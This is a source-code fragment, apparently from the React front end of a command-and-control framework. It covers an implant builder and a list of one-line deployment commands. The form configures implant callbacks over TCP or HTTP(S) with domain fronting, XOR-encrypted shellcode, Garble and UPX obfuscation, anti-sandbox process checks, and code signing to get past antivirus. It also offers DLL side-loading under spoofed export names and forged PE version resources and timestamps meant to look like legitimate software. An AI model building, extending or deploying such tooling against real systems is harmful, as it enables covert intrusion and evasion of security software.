                  type="text"
                  name="name"
                  value={formData.name}
                  onChange={handleInputChange}
                  placeholder="my-implant"
                />
              </div>

              <div className="form-group">
                <label>选择监听器</label>
                <select
                  name="listener_id"
                  value={formData.listener_id}
                  onChange={(e) => {
                    const id = e.target.value
                    const listener = builderInfo?.listeners?.find((l) => l.id === id)
                    if (listener) {
                      // 优先使用手动配置的公网地址；没有则用绑定地址（0.0.0.0 回退到 localhost）
                      const host = listener.public_addr
                        ? listener.public_addr
                        : listener.bind_addr === '0.0.0.0' || !listener.bind_addr
                          ? 'localhost'
                          : listener.bind_addr
                      // 按监听器类型自动选择协议与地址格式：
                      // tcp/websocket → host:port（无前缀，走自定义 TCP 帧通道）
                      // http/https → http(s)://host:port（HTTP 轮询/域前置）
                      const lp = (listener.protocol || 'http').toLowerCase()
                      let url: string
                      let proto: string
                      if (lp === 'tcp' || lp === 'websocket') { url = `${host}:${listener.bind_port}`; proto = 'tcp' }
                      else if (lp === 'https') { url = `https://${host}:${listener.bind_port}`; proto = 'https' }
                      else { url = `http://${host}:${listener.bind_port}`; proto = 'http' }
                      setFormData((prev) => ({
                        ...prev,
                        listener_id: id,
                        server_url: url,
                        protocol: proto,
                      }))
                    } else {
                      setFormData((prev) => ({ ...prev, listener_id: id }))
                    }
                  }}
                >
                  <option value="">-- 不选择（手动填写地址） --</option>
                  {builderInfo?.listeners?.map((l) => (
                    <option key={l.id} value={l.id}>
                      {l.name} ({l.type === 'http' ? 'HTTP' : 'TCP'} · {l.public_addr || l.bind_addr}:{l.bind_port}) {l.status === 'running' ? '●' : ''}
                    </option>
                  ))}
                </select>
                {builderInfo?.listeners && builderInfo.listeners.length > 0 && (
                  <span className="field-hint">选择监听后自动填写服务器地址与协议</span>
                )}
              </div>

              <div className="form-row form-row-3">
                <div className="form-group">
                  <label>植入端语言</label>
                  <select name="language" value={formData.language || 'go'} onChange={handleInputChange}>
                    <option value="go">Go（全功能）</option>
                    <option value="c" disabled={!builderInfo?.languages?.c}>
                      C（超小体积 ~50KB）{!builderInfo?.languages?.c ? ' — 未检测到 mingw gcc' : ''}
                    </option>
                  </select>
                  {formData.language === 'c' ? (
                    <p className="form-hint" style={{ color: 'var(--color-success)' }}>
                      C 植入端：仅 Windows exe，支持命令执行 / 文件列表，注册 / 心跳 / 任务回传全链路
                    </p>
                  ) : (
                    <p className="form-hint">Go 植入端全功能；C 植入端体积极小但功能受限</p>
                  )}
                  {/* 服务端给出的探测结论：找到哪个 gcc / 为什么没找到 / 怎么修 */}
                  {builderInfo?.languages?.c_message && (
                    <p
                      className="form-hint"
                      style={{ color: builderInfo?.languages?.c ? 'var(--color-text-muted)' : 'var(--color-warning, #d97706)', lineHeight: 1.6 }}
                    >
                      {builderInfo.languages.c_message}
                    </p>
                  )}
                </div>
              </div>

              <div className="form-row form-row-3">
                <div className="form-group">
                  <label>输出格式</label>
                  <select name="format" value={formData.format} onChange={handleInputChange}>
                    {formData.os === 'windows' ? (
                      <>
                        <option value="exe">EXE 可执行文件</option>
                        <option value="dll">DLL 动态库</option>
                        <option value="shellcode">Shellcode (Hex字符串)</option>
                        <option value="shellcode_bin">Shellcode (.bin文件)</option>
                        <option value="raw">Raw</option>
                      </>
                    ) : (
                      <>
                        <option value="bin">ELF 可执行文件</option>
                        <option value="so">SO 动态库</option>
                        <option value="raw">Raw</option>
                      </>
                    )}
                  </select>
                </div>
                <div className="form-group">
                  <label>回连通道</label>
                  <select name="protocol" value={formData.protocol} onChange={handleInputChange}>
                    <option value="tcp">TCP（推荐）</option>
                    <option value="http">HTTP（轮询）</option>
                    <option value="https">HTTPS（轮询 + TLS）</option>
                  </select>
                  <p className="form-hint">TCP 填 host:port，HTTP(S) 填完整 URL</p>
                </div>
                <div className="form-group">
                  <label>构建档案</label>
                  <select name="profile" value={formData.profile} onChange={handleInputChange}>
                    <option value="full">完整（全功能）</option>
                    <option value="light">精简（小体积）</option>
                  </select>
                  <p className="form-hint">精简档案裁剪截图/中继/注入等模块</p>
                </div>
              </div>

              <div className="form-row">
                <div className="form-group">
                  <label>目标系统</label>
                  <select name="os" value={formData.os} onChange={handleInputChange}>
                    <option value="windows">Windows</option>
                    <option value="linux">Linux</option>
                    <option value="darwin">macOS</option>
                  </select>
                </div>
                <div className="form-group">
                  <label>目标架构</label>
                  <select name="arch" value={formData.arch} onChange={handleInputChange}>
                    <option value="amd64">x64 (AMD64)</option>
                    <option value="386">x86 (i386)</option>
                    <option value="arm64">ARM64</option>
                  </select>
                </div>
              </div>

              <div className="form-group">
                <label style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                  选择中继会话（可选，链式回连）
                  <button type="button" className="btn-small" onClick={fetchRelayNodes} title="刷新中继列表">
                    <RefreshCw size={12} /> 刷新
                  </button>
                </label>
                <select
                  value=""
                  onChange={(e) => {
                    const sid = e.target.value
                    if (!sid) return
                    const node = relayNodes.find((n) => n.session_id === sid)
                    if (node && node.host && node.port) {
                      setFormData((prev) => ({ ...prev, server_url: `${node.host}:${node.port}` }))
                    }
                  }}
                >
                  <option value="">-- 选择已启动的中继会话 --</option>
                  {relayNodes.map((n) => (
                    <option key={n.session_id} value={n.session_id}>
                      {n.hostname}（{n.host}:{n.port}）
                    </option>
                  ))}
                </select>
                {relayNodes.length > 0 ? (
                  <span className="field-hint">选择后自动把「服务器地址」填为中继地址（叶子直接连中继，不经团队服务器）</span>
                ) : (
                  <span className="field-hint">暂无中继节点：先在出口主机会话的「中继」页启动中继，再点「刷新」</span>
                )}
              </div>

              <div className="form-group">
                <label>服务器地址 (C2) <span style={{color: 'var(--color-danger)'}}>*</span></label>
                <input
                  type="text"
                  name="server_url"
                  value={formData.server_url}
                  onChange={handleInputChange}
                  onKeyPress={handleServerUrlKeyPress}
                  placeholder="例如: 192.168.1.10:9999（直连填团队服务器地址）"
                />
                <p className="form-hint">
                  直连团队服务器填其地址；链式回连填中继 IP:端口（也可用「选择中继会话」自动填）
                </p>
                <p className="form-hint">
                  {formData.protocol === 'tcp'
                    ? <span style={{ color: 'var(--color-warning, #f59e0b)' }}>TCP 通道请勿加 http:// 前缀（填 host:port，误加自动剥离）</span>
                    : <span style={{ color: 'var(--color-primary, #60a5fa)' }}>HTTP/HTTPS 通道需以 http(s):// 开头（配合「域前置拟态域名」过白名单）</span>}
                </p>
              </div>

              <div className="form-group">
                <label>域前置拟态域名（可选）</label>
                <input
                  type="text"
                  name="front_domain"
                  value={formData.front_domain}
                  onChange={handleInputChange}
                  placeholder="例如: cdn.example.com（配合 https:// 服务器地址走 CDN 白名单出口）"
                />
                <p className="form-hint">
                  服务器地址以 <code>https://</code> 开头时启用 HTTPS 轮询通道；此处填合法 CDN/反代域名，
                  植入端 TLS SNI 与 HTTP Host 均伪装为该域名（域前置），目标机出站流量表现为访问合法域名。
                </p>
              </div>

              <Section
                title="高级选项"
                desc="回连节奏、重试、工作时间、中继与域前置等。节奏类参数留空即跟随「设置 → 植入端默认参数」，不建议改成固定短周期。"
                badge={<Badge>可选</Badge>}
                defaultOpen={false}
              >
                <div className="form-row">
                  <div className="form-group">
                    <label>心跳间隔 (秒)</label>
                    <input
                      type="number"
                      name="interval"
                      value={formData.interval || ''}
                      placeholder={String(defaultInterval)}
                      onChange={handleInputChange}
                      min={1}
                      max={300}
                    />
                    <p className="form-hint">留空 = 用服务端当前配置（{defaultInterval} 秒）</p>
                  </div>
                  <div className="form-group">
                    <label>抖动 (%)</label>
                    <input
                      type="number"
                      name="jitter"
                      value={formData.jitter || ''}
                      placeholder={String(defaultJitter)}
                      onChange={handleInputChange}
                      min={0}
                      max={100}
                    />
                    <p className="form-hint">留空 = 用服务端当前配置（±{defaultJitter}%）</p>
                  </div>
                </div>
                <div className="form-row">
                  <div className="form-group">
                    <label>重试次数</label>
                    <input
                      type="number"
                      name="retry_count"
                      value={formData.retry_count || ''}
                      placeholder={String(defaultRetryCount)}
                      onChange={handleInputChange}
                      min={0}
                      max={10}
                    />
                    <p className="form-hint">留空 = 默认 {defaultRetryCount} 次</p>
                  </div>
                  <div className="form-group">
                    <label>重试间隔 (秒)</label>
                    <input
                      type="number"
                      name="retry_wait"
                      value={formData.retry_wait || ''}
                      placeholder={String(defaultRetryWait)}
                      onChange={handleInputChange}
                      min={1}
                      max={60}
                    />
                    <p className="form-hint">留空 = 用服务端当前配置（{defaultRetryWait} 秒）</p>
                  </div>
                </div>
                <div className="form-row">
                  <div className="form-group">
                    <label>终止日期 (可选)</label>
                    <input
                      type="date"
                      name="kill_date"
                      value={formData.kill_date}
                      onChange={handleInputChange}
                    />
                  </div>
                  <div className="form-group">
                    <label>工作时间 (可选)</label>
                    <input
                      type="text"
                      name="working_hours"
                      value={formData.working_hours}
                      onChange={handleInputChange}
                      placeholder="09:00-18:00"
                    />
                  </div>
                </div>
              </Section>

              <Section
                title="免杀与落地选项"
                desc="决定载荷的静态特征面，以及它能不能在装有 360/电脑管家这类国产杀软的主机上跑起来。默认值按「最小特征、需要时才开」设置，不确定就保持默认。"
                badge={<Badge tone="accent">对抗面</Badge>}
                defaultOpen
              >

                <div className="evasion-toggle-row">
                  <div className="toggle-group">
                    <label className="toggle-label">
                      <input
                        type="checkbox"
                        name="xor_encrypt"
                        checked={formData.xor_encrypt || false}
                        onChange={handleInputChange}
                      />
                      <span>XOR Shellcode 加密</span>
                    </label>
                    <p className="form-hint">对生成的 shellcode 使用随机 XOR 密钥加密</p>
                  </div>

                  {formData.xor_encrypt && (
                    <div className="form-group" style={{ marginTop: '8px' }}>
                      <label>XOR 密钥长度</label>
                      <select name="xor_key_size" value={formData.xor_key_size || 16} onChange={handleInputChange}>
                        <option value={8}>8 字节</option>
                        <option value={16}>16 字节</option>
                        <option value={32}>32 字节</option>
                      </select>
                    </div>
                  )}
                </div>

                <div className="evasion-toggle-row">
                  <div className="toggle-group">
                    <label className={`toggle-label ${!builderInfo?.evasion?.garble_available ? 'toggle-disabled' : ''}`}>
                      <input
                        type="checkbox"
                        name="garble_enabled"
                        checked={(formData.garble_enabled || false) && (builderInfo?.evasion?.garble_available || false)}
                        onChange={handleInputChange}
                        disabled={!builderInfo?.evasion?.garble_available}
                      />
                      <span>Garble 混淆</span>
                      {builderInfo?.evasion?.garble_available ? (
                        <span className="status-badge available">可用</span>
                      ) : (
                        <span className="status-badge unavailable">不可用</span>
                      )}
                    </label>
                    <p className="form-hint">
                      {builderInfo?.evasion?.garble_available
                        ? '编译时混淆字符串、移除调试信息'
                        : builderInfo?.evasion?.garble_message ||
                          'Garble 混淆需要安装 garble (go install mvdan.cc/garble@latest)'}
                    </p>
                  </div>
                </div>

                <div className="evasion-toggle-row">
                  <div className="toggle-group">
                    <label className={`toggle-label ${!builderInfo?.evasion?.upx_available ? 'toggle-disabled' : ''}`}>
                      <input
                        type="checkbox"
                        name="upx_enabled"
                        checked={(formData.upx_enabled || false) && (builderInfo?.evasion?.upx_available || false)}
                        onChange={handleInputChange}
                        disabled={!builderInfo?.evasion?.upx_available}
                      />
                      <span>UPX 压缩</span>
                      {builderInfo?.evasion?.upx_available ? (
                        <span className="status-badge available">可用</span>
                      ) : (
                        <span className="status-badge unavailable">未安装</span>
                      )}
                    </label>
                    <p className="form-hint">
                      {builderInfo?.evasion?.upx_available
                        ? '使用 UPX --best --lzma 压缩可执行文件 (仅Windows)'
                        : 'UPX 需要安装 (https://upx.github.io)'}
                    </p>
                  </div>
                </div>

                <div className="evasion-toggle-row">
                  <div className="toggle-group">
                    <label className="toggle-label">
                      <input
                        type="checkbox"
                        name="evasion_scan"
                        checked={formData.evasion_scan || false}
                        onChange={handleInputChange}
                      />
                      <span>主动反沙箱进程检测</span>
                      <span className="status-badge unavailable">默认关闭</span>
                    </label>
                    <p className="form-hint">
                      启动时枚举进程并与安全软件/分析工具进程名比对，命中则延迟执行。
                      <strong>会引入 toolhelp32 导入与一批杀软进程名字符串</strong>
                      ，360/火绒/电脑管家的主动防御会直接拦截该对抗行为 —— 只在明确需要
                      "识别分析环境"时开启。
                    </p>
                  </div>
                </div>

                <div className="evasion-toggle-row">
                  <div className="toggle-group">
                    <label className="toggle-label">
                      <input
                        type="checkbox"
                        name="sign_enabled"
                        checked={formData.sign_enabled || false}
                        onChange={handleInputChange}
                        disabled={!builderInfo?.evasion?.sign_configured}
                      />
                      <span>代码签名 (Authenticode)</span>
                      {builderInfo?.evasion?.sign_configured ? (
                        <span className="status-badge available">已配置</span>
                      ) : (
                        <span className="status-badge unavailable">未配置</span>
                      )}
                    </label>
                    <p className="form-hint">
                      {builderInfo?.evasion?.sign_message ||
                        '在服务端配置 builder.sign_enabled + sign_pfx_path(密码) 或 sign_thumbprint 后可用'}
                      <br />
                      在装有 <strong>360/电脑管家</strong>的主机上，<strong>未签名的新 PE 会在创建进程阶段被拒绝执行并删除</strong>
                      （实测连 Hello-World 程序也一样）；签名是"能不能跑起来"的敲门砖，但不是免杀银弹。
                    </p>
                  </div>
                </div>

                <div className="evasion-toggle-row">
                  <div className="toggle-group">
                    <label className="toggle-label">
                      <input
                        type="checkbox"
                        name="bof_enabled"
                        checked={formData.bof_enabled || false}
                        onChange={handleInputChange}
                      />
                      <span>BOF 支持 (Cobalt Strike BOF)</span>
                      <span className="status-badge unavailable">默认关闭</span>
                    </label>
                    <p className="form-hint">
                      开启后载荷会带上整套 <code>Beacon*</code> API 名字（<code>BeaconDataParse</code>/<code>BeaconOutput</code>…，
                      实测 22 处明文命中），这是 full 档案里唯一剩下的高信号特征 —— 只有确实要跑 BOF 时才勾。
                    </p>
                  </div>
                </div>

                {formData.format === 'dll' && (() => {
                  // DLL 走 c-shared，**必须**有与目标架构一致的 mingw gcc：
                  // 选 amd64 但本机只有 i686 时，这里就要当场说清 + 给出可点的替代架构，
                  // 而不是等构建失败（"我明明选了 Go 的 dll 为什么不行"）。
                  const arch = formData.arch || 'amd64'
                  const dllArch = builderInfo?.evasion?.dll_arch?.[arch]
                  const ok = dllArch ? dllArch.available : (builderInfo?.evasion?.dll_available ?? false)
                  const msg = dllArch?.message || builderInfo?.evasion?.dll_message || ''
                  const alt386 = builderInfo?.evasion?.dll_arch?.['386']?.available
                  return (
                    <div className="evasion-toggle-row">
                      <div className="toggle-group">
                        <label className="toggle-label">
                          <span>DLL 载荷（白加黑 / rundll32）</span>
                          {ok ? <Badge tone="ok">本机可用</Badge> : <Badge tone="danger">缺 {arch} 版 gcc</Badge>}
                        </label>

                        {ok ? (
                          <p className="form-hint">{msg}</p>
                        ) : (
                          <Callout tone="danger" title={`当前架构 ${arch} 的 DLL 无法构建`} style={{ marginTop: 6 }}>
                            <div style={{ lineHeight: 1.8 }}>
                              Go 的 DLL 走 <code>-buildmode=c-shared</code>，**内部仍要调用 C 编译器（cgo）**，
                              因此必须装<strong>与目标架构一致</strong>的 mingw-w64 gcc（x64 要
                              <code>x86_64-w64-mingw32-gcc</code>，只有 32 位的 i686 编译器编不出 64 位 DLL）。
                            </div>
                            <div style={{ marginTop: 6, fontFamily: 'var(--font-mono)', fontSize: 11 }}>{msg}</div>
                            <div style={{ marginTop: 8, display: 'flex', gap: 8, flexWrap: 'wrap' }}>
                              {alt386 && arch !== '386' && (
                                <button
                                  type="button"
                                  className="btn-small"
                                  onClick={() => setFormData((prev) => ({ ...prev, arch: '386' }))}
                                >
                                  改用 386 架构构建（本机已有 i686 gcc）
                                </button>
                              )}
                              <span className="form-hint" style={{ margin: 0 }}>
                                或在「设置 → 植入端与载荷构建」把 <code>mingw_gcc_path</code> 指向 x64 版 gcc。
                              </span>
                            </div>
                          </Callout>
                        )}

                        <div style={{ display: 'flex', gap: '8px', alignItems: 'center', marginTop: '8px', flexWrap: 'wrap' }}>
                          <div className="form-group" style={{ margin: 0 }}>
                            <label>导出函数名</label>
                            <input
                              type="text"
                              name="dll_export"
                              value={formData.dll_export ?? ''}
                              onChange={handleInputChange}
                              placeholder="Start（rundll32 payload.dll,Start）"
                            />
                          </div>
                          <label className="toggle-label" style={{ marginTop: 18 }}>
                            <input
                              type="checkbox"
                              name="dll_autostart"
                              checked={formData.dll_autostart !== false}
                              onChange={handleInputChange}
                            />
                            <span>DLL 加载即启动</span>
                          </label>
                        </div>
                        <p className="form-hint">
                          白加黑场景宿主不一定调用我们的导出函数，所以默认<strong>加载即启动</strong>；
                          需要宿主控制时机时取消勾选。导出名可以填成宿主期望的名字（例如
                          <code>GetFileVersionInfoW</code>）——服务端用 C 侧 __stdcall 包装导出，
                          不会和系统声明冲突（386 上也会剥掉 @16 修饰）。
                        </p>
                      </div>
                    </div>
                  )
                })()}

                <div className="evasion-toggle-row">
                  <div className="toggle-group">
                    <label className="toggle-label"><span>启动随机延迟 (秒)</span></label>                    <p className="form-hint">
                      载荷启动后随机休眠 [最小, 最大] 秒再首次回连，打乱"启动即行为"的
                      检测节奏。留空 = 用服务端当前配置（{defaultStartupMin}~{defaultStartupMax} 秒）。
                      注意：0 表示"未设置"，服务端会回退到配置值，**不是**不延迟。
                    </p>
                    <div style={{ display: 'flex', gap: '8px', marginTop: '8px' }}>
                      <div className="form-group" style={{ margin: 0 }}>
                        <label>最小</label>
                        <input
                          type="number"
                          name="startup_delay_min"
                          min={0}
                          max={600}
                          placeholder={String(defaultStartupMin)}
                          value={formData.startup_delay_min || ''}
                          onChange={handleInputChange}
                        />
                      </div>
                      <div className="form-group" style={{ margin: 0 }}>
                        <label>最大</label>
                        <input
                          type="number"
                          name="startup_delay_max"
                          min={0}
                          max={600}
                          placeholder={String(defaultStartupMax)}
                          value={formData.startup_delay_max || ''}
                          onChange={handleInputChange}
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </Section>

              {/* ── PE 版本资源 / 图标 / 公司信息 / 时间戳（v1.4.0 S3 第二批）──
                  定位必须先说清楚：这一组改的是**静态外观**（"这份 PE 有没有公司名/图标/版本信息"），
                  它**解决不了**"未签名 PE 被国产杀软在创建进程阶段拦下"（那是签名/信誉层，见上面
                  的代码签名说明）。控件只在服务端真的会处理的组合下渲染：Windows × exe/bin/dll ×
                  非 C 植入端（服务端 shouldPatchResources 的判定口径），其余组合只给一句说明，
                  免得操作员填了半天却拿到"构建成功但没资源"的哑结果。 */}
              <Section
                title="PE 版本资源与图标（可选，静态降特征）"
                desc={
                  <>
                    往 PE 的 <code>.rsrc</code> 里写 VS_VERSIONINFO（公司名/产品名/描述/版本/版权/
                    原始文件名/内部名）、图标与 COFF 时间戳，让产物看起来像一份正经软件，
                    而不是一个"未命名的新 PE"。
                    <strong>它改的是静态特征，不是免杀</strong>：解决不了"未签名 PE 被 360/电脑管家
                    在创建进程阶段拦下"这类签名/信誉层拦截 —— 那一层得先把代码签名配好，
                    这组参数只能让静态信息不再明显可疑。
                    {evasion?.resource_note ? (
                      <>
                        <br />
                        服务端口径：{evasion.resource_note}
                        {evasion?.resource_order ? `（写入位置：${evasion.resource_order}）` : ''}
                      </>
                    ) : null}
                  </>
                }
                badge={
                  resourceSupported ? (
                    <Badge tone="accent">{resourceDefaultOff ? '可选 · 默认不注入' : '可选'}</Badge>
                  ) : (
                    <Badge tone="warn">当前选择不生效</Badge>
                  )
                }
                defaultOpen={false}
              >
                {!resourceSupported ? (
                  <Callout tone="info" title="当前这组参数不会被服务端处理，所以不显示控件">
                    {resourceUnsupportedReason}。把「目标系统 + 输出格式」切到 Windows 的
                    <code>exe</code> / <code>dll</code> / <code>bin</code> 且植入端语言为 Go 时，
                    这些控件才会出现。
                  </Callout>
                ) : (
                  <>
                    {/* 预设：选项来自 GET /builders 的 evasion.resource_presets（不硬编码）；
                        服务端返回空数组（老版本）时这里退化成"只说明、不显示下拉"。 */}
                    <div className="form-group">
                      {resourcePresets.length > 0 ? (
                        <>
                          <label>资源预设</label>
                          <select
                            name="resource_preset"
                            value={formData.resource_preset || ''}
                            onChange={handleInputChange}
                          >
                            <option value="">不使用预设</option>
                            {resourcePresets.map((p) => (
                              <option key={p} value={p}>
                                {p}
                              </option>
                            ))}
                          </select>
                          <p className="form-hint">
                            预设<strong>只填你没显式给的字段</strong>，下面手填的值永远优先（预设不覆盖你填的内容）。
                            当前服务端提供：{resourcePresets.join(' / ')}。
                            {resourcePresets.includes('neutral') ? (
                              <>
                                其中 <code>neutral</code> 是自有品牌「ToShell Ops Toolkit」（公司名/产品名/描述/版权 +
                                <code>toshell-agent.exe|dll</code> + 固定时间戳），<strong>不冒充任何真实厂商/系统组件</strong>，
                                也不替你猜版本号（版本留空 → 服务端用 1.0.0.0）。
                              </>
                            ) : null}
                            预设名由服务端校验，填错会让构建失败。
                            {formData.resource_preset
                              ? ` 已选「${formData.resource_preset}」：只有留空的字段由它补齐。`
                              : ''}
                          </p>
                        </>
                      ) : (
                        <Callout tone="default" title="当前服务端未提供资源预设">
                          <code>GET /builders</code> 的 <code>evasion.resource_presets</code> 为空
                          （多为老版本服务端）：预设下拉不显示，下面的字段与时间戳仍可手填，
                          由服务端做校验。
                        </Callout>
                      )}
                    </div>

                    <div className="form-row form-row-3">
                      <div className="form-group">
                        <label>公司名</label>
                        <input
                          type="text"
                          name="resource_company_name"
                          value={formData.resource_company_name || ''}
                          onChange={handleInputChange}
                          placeholder="留空 = 不写该字段"
                        />
                      </div>
                      <div className="form-group">
                        <label>产品名</label>
                        <input
                          type="text"
                          name="resource_product_name"
                          value={formData.resource_product_name || ''}
                          onChange={handleInputChange}
                          placeholder="留空 = 不写该字段"
                        />
                      </div>
                      <div className="form-group">
                        <label>文件描述</label>
                        <input
                          type="text"
                          name="resource_file_description"
                          value={formData.resource_file_description || ''}
                          onChange={handleInputChange}
                          placeholder="留空 = 不写该字段"
                        />
                      </div>
                    </div>

                    <div className="form-row form-row-3">
                      <div className="form-group">
                        <label>文件版本</label>
                        <input
                          type="text"
                          name="resource_file_version"
                          value={formData.resource_file_version || ''}
                          onChange={handleInputChange}
                          placeholder="1.4.0.0"
                        />
                      </div>
                      <div className="form-group">
                        <label>产品版本</label>
                        <input
                          type="text"
                          name="resource_product_version"
                          value={formData.resource_product_version || ''}
                          onChange={handleInputChange}
                          placeholder="1.4.0.0"
                        />
                      </div>
                      <div className="form-group">
                        <label>版权信息</label>
                        <input
                          type="text"
                          name="resource_legal_copyright"
                          value={formData.resource_legal_copyright || ''}
                          onChange={handleInputChange}
                          placeholder="留空 = 不写该字段"
                        />
                      </div>
                    </div>

                    <div className="form-row">
                      <div className="form-group">
                        <label>原始文件名</label>
                        <input
                          type="text"
                          name="resource_original_filename"
                          value={formData.resource_original_filename || ''}
                          onChange={handleInputChange}
                          placeholder="如 toshell-agent.exe"
                        />
                      </div>
                      <div className="form-group">
                        <label>内部名</label>
                        <input
                          type="text"
                          name="resource_internal_name"
                          value={formData.resource_internal_name || ''}
                          onChange={handleInputChange}
                          placeholder="如 toshell-agent"
                        />
                      </div>
                    </div>
                    <p className="form-hint">
                      以上八个字段<strong>留空即不写</strong>（全空 = 完全不注入资源，产物与以前逐字节一致）。
                      文件/产品版本写成 <code>a.b.c.d</code>（如 <code>1.4.0.0</code>），留空时服务端用
                      <code>1.0.0.0</code>；原始文件名与交付格式保持一致更像正常软件
                      （<code>dll</code> 写 <code>.dll</code>，<code>exe</code>/<code>bin</code> 写 <code>.exe</code>）。
                    </p>

                    <div className="form-group">
                      <label>载荷图标（.ico）</label>
                      <input
                        type="text"
                        name="resource_icon_path"
                        value={formData.resource_icon_path || ''}
                        onChange={handleInputChange}
                        placeholder="服务端本机 .ico 路径（留空 = 用设置里的 implant.icon_path）"
                      />
                      <p className="form-hint">
                        这里填的是<strong>服务端本机上的 .ico 路径，不是上传文件</strong>：服务端会校验
                        存在 / 是文件 / <code>.ico</code> 后缀 / 不超过 1 MiB，再做一次 ICO 结构校验。
                        留空则回退到「设置 → 植入端与载荷」里的 <code>implant.icon_path</code>；
                        两处都留空 = 不打图标。
                      </p>
                    </div>

                    <div className="form-row">
                      <div className="form-group">
                        <label>时间戳策略</label>
                        <select
                          name="resource_timestamp_mode"
                          value={formData.resource_timestamp_mode || ''}
                          onChange={handleInputChange}
                        >
                          <option value="">不改（保持链接器原值）</option>
                          <option value="fixed">固定（用下面的时间）</option>
                          <option value="random">随机（不晚于构建机当前时间）</option>
                        </select>
                        <p className="form-hint">
                          Go 链接器默认把 COFF 时间戳置 0，这本身就是一个"非正常发布"的信号；
                          改成一个过去的时间更像真实构建。选「不改」时该字段不发送（等价于旧行为）。
                          任何策略都<strong>不允许晚于构建机当前时间</strong>（未来时间戳是比 0 更明显的伪造信号）。
                        </p>
                      </div>
                      {formData.resource_timestamp_mode === 'fixed' && (
                        <div className="form-group">
                          <label>固定时间戳 (RFC3339)</label>
                          <input
                            type="text"
                            name="resource_timestamp"
                            value={formData.resource_timestamp || ''}
                            onChange={handleInputChange}
                            placeholder="2024-03-15T09:00:00Z"
                          />
                          <p className="form-hint">
                            留空 = 用服务端内置的 <code>2024-03-15T09:00:00Z</code>；填未来时间会被服务端拒绝。
                            只有「固定」策略才发送这个值（切回「不改」后不会捎带发出去）。
                          </p>
                        </div>
                      )}
                    </div>
                  </>
                )}
              </Section>
            </div>
            <div className="modal-footer">
              <button className="btn btn-secondary" onClick={() => setShowModal(false)}>
                取消
              </button>
              <button className="btn btn-primary" onClick={handleBuild} disabled={building}>
                {building ? (
                  <>
                    <Loader2 size={16} className="spinning" />
                    <span>构建中...</span>
                  </>
                ) : (
                  '构建'
                )}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

/**
 * 一键上线命令列表：命令与下载地址均由服务端生成（internal/server/api/oneliner.go），
 * 这里只负责展示多个免杀变体、标注推荐项、以及每条的独立复制按钮。
 *
 * v1.3.5 起服务端会同时给出「下载即执行」与「加载器链」两类共 10~14 条，一屏铺开会很长，
 * 因此这里做了三件事：按类型分组筛选、按关键字搜索、风险等级可见（note 里带"风险等级：高/中/低"）。
 */
function OneLinerList({
  set,
  loading,
  copiedCmd,
  onCopy,
  buildId,
  format,
}: {
  set: OneLinerSet | null
  loading?: boolean
  copiedCmd: string | null
  onCopy: (cmd: string) => void
  /** 本次构建的载荷 ID：用于自动/手动替换命令里的 <DLL载荷ID> / <shellcode载荷ID> */
  buildId?: string
  format?: string
}) {
  const [query, setQuery] = useState('')
  const [kind, setKind] = useState<'all' | 'direct' | 'loader'>('all')
  // 载荷 ID 覆盖值：默认用本次构建的 ID（仅当本次载荷就是 dll/shellcode 时才适用）
  const [idOverride, setIdOverride] = useState('')
  const currentIsDLL = (format || '').toLowerCase() === 'dll'
  const currentIsSC = ['shellcode', 'shellcode_bin'].includes((format || '').toLowerCase())
  const effectiveId = idOverride.trim() || ((currentIsDLL || currentIsSC) ? (buildId || '') : '')
  // 命令里的占位符替换（服务端在"当前载荷格式匹配"时已经填好真实地址，这里是兜底与手工指定）
  const fillIds = (cmd: string) =>
    effectiveId
      ? cmd.split('<DLL载荷ID>').join(effectiveId).split('<shellcode载荷ID>').join(effectiveId)
      : cmd

  if (loading) {
    return (
      <div className="oneliner-loading">
        <Loader2 size={14} className="spinning" />
        <span>正在生成一条命令上线命令…</span>
      </div>
    )
  }
  if (!set) return null
  if (set.error || !set.variants?.length) {
    return <p className="oneliner-hint">{set.error || '暂无可用的上线命令'}</p>
  }

  // 加载器链的判定：服务端给加载器链写了 note（含前置条件/风险等级），普通"下载即执行"没有
  const isLoader = (n?: string) => !!n && n.length > 0
  const riskOf = (note?: string): '低' | '中' | '高' | null => {
    if (!note) return null
    const m = note.match(/风险等级[：:]\s*(低|中|高)/)
    return m ? (m[1] as '低' | '中' | '高') : null
  }
  const q = query.trim().toLowerCase()
  const visible = set.variants.filter((v) => {
    if (kind === 'direct' && isLoader(v.note)) return false
    if (kind === 'loader' && !isLoader(v.note)) return false
    if (!q) return true
    return `${v.name} ${v.desc} ${v.command} ${v.note || ''}`.toLowerCase().includes(q)
  })
  const loaderCount = set.variants.filter((v) => isLoader(v.note)).length

  return (
    <>
      {set.base_url && (
        <div className="oneliner-meta">
          <Server size={13} />
          <span>下载地址</span>
          <code>{set.base_url}</code>
        </div>
      )}
      {set.warning && (
        <div className="oneliner-warning">
          <AlertTriangle size={14} />
          <span>{set.warning}</span>
        </div>
      )}

      {/* 分组 / 搜索 / 批量复制：条数多的时候先筛再用 */}
      <div className="oneliner-filters">
        <div className="oneliner-seg">
          <button className={kind === 'all' ? 'active' : ''} onClick={() => setKind('all')}>
            全部 {set.variants.length}
          </button>
          <button className={kind === 'direct' ? 'active' : ''} onClick={() => setKind('direct')}>
            下载即执行 {set.variants.length - loaderCount}
          </button>
          <button className={kind === 'loader' ? 'active' : ''} onClick={() => setKind('loader')}>
            加载器链 {loaderCount}
          </button>
        </div>
        <div className="oneliner-search">
          <Search size={13} />
          <input value={query} onChange={(e) => setQuery(e.target.value)} placeholder="搜索命令 / 手法 / 前置条件" />
        </div>
        <button
          className="oneliner-copy-btn"
          title="复制当前筛选出的全部命令"
          onClick={() => onCopy(visible.map((v) => fillIds(v.command)).join('\r\n'))}
          disabled={visible.length === 0}
        >
          <Copy size={14} /> 复制全部（{visible.length}）
        </button>
      </div>

      {/* 载荷 ID 填充：加载器链需要 dll / shellcode 格式载荷的 ID。
          当前载荷就是那个格式时服务端已直接填入真实下载地址；否则在这里粘一次 ID 即可
          （ID 在「上次构建」面板、载荷列表、或构建响应的 download_url 里都能看到）。 */}
      <div className="oneliner-idfill">
        <span className="oneliner-idfill-label">载荷 ID 填充</span>
        <input
          value={idOverride}
          onChange={(e) => setIdOverride(e.target.value)}
          placeholder={buildId ? `留空 = 用本次构建（${buildId}）` : '如 build-1789458791413714300'}
        />
        {(currentIsDLL || currentIsSC) && buildId ? (
          <Badge tone="ok">已自动填入本次 {format} 载荷</Badge>
        ) : (
          <span className="oneliner-hint" style={{ margin: 0 }}>
